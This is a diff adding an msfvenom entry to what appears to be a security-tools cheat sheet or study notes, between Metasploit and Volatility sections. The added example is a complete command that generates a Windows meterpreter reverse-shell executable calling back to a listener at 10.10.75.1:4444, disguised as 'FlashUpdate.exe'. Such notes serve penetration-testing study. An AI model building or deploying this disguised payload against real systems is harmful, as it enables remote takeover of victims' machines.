@@ -193,6 +193,11 @@ exploit
   - `background` puts the current meterpreter session in the background
 
 #### msfvenom <!-- omit in toc -->
+Allows for the creation of specifically packaged and targeted malware.
+Example:
+`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.75.1 lport=4444 -f exe -o ./FlashUpdate.exe`
+
+---
 
 ## Volatility Framework 
 `vol.py` runs the volatility framework
